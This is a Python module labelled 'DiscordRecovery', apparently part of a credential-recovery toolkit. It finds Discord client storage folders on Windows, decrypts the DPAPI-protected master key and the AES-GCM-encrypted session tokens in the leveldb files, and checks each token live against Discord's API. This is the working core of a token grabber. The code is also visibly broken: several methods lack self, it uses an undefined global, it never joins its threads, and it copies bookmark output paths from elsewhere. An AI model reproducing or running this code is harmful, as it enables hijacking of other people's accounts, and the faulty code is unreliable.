import os

from ctypes import windll
from ctypes import wintypes
from ctypes import byref
from ctypes import cdll
from ctypes import Structure
from ctypes import POINTER
from ctypes import c_char
from ctypes import c_buffer
from urllib.request import Request
from urllib.request import urlopen
from Crypto.Cipher import AES
from base64 import b64decode
from json import loads as json_loads
import threading
import re

from config import Constant
from config import ModuleManager


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

class DiscordRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="DiscordRecovery")

        self.banner("""
     _______         ______  _                          _ 
    |.-----.|       (______)(_)                        | |
    ||x . x||        _     _ _  ___  ____ ___   ____ __| |
    ||_.-._||       | |   | | |/___)/ ___) _ \ / ___) _  |
    `--)-(--`       | |__/ /| |___ ( (__| |_| | |  ( (_| |
   __[=== o]___     |_____/ |_(___/ \____)___/|_|   \____|
  |:::::::::::|\    
  `-=========-`()       Recover Lost Discord Accounts
                """)

        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
        self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_bookmarks_all.csv')
        self.output_filename_json = os.path.join(self.browsers_folder, 'browser_bookmarks_all.json')

        if not os.path.isdir(self.browsers_folder):
            os.makedirs(self.browsers_folder)

    def GetData(self, blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(self, encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return self.GetData(blob_out)

    def checkToken(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
            return True
        except:
            return False
    
    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def GetDiscord(path, arg):
        if not os.path.exists(f"{path}/Local State"):
            return

        pathC = path + arg

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        # print(path, master_key)

        for file in os.listdir(pathC):
            # print(path, file)
            if file.endswith(".log") or file.endswith(".ldb"):
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokens
                        tokenDecoded = DecryptValue(
                            b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded):
                            if not tokenDecoded in Tokens:
                                Tokens += tokenDecoded
                                print(tokenDecoded, path)

    
    def run(self):
        try:

            self.mdebug("Looking for the token in {}")

            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            temp = os.getenv("TEMP")
            discordPaths = [
                [f"{roaming}/Discord", "/Local Storage/leveldb"],
                [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
                [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
                [f"{roaming}/discordptb", "/Local Storage/leveldb"],
            ]

            Threadlist = []
            for patt in discordPaths:
                a = threading.Thread(target=self.GetDiscord, args=[patt[0], patt[1]])
                a.start()
                Threadlist.append(a)
            
            self.mprint("Found Token")

        except Exception as e:
            self.merror(f"Unable to locate any discord token: {e}. Skipping this module")
            return
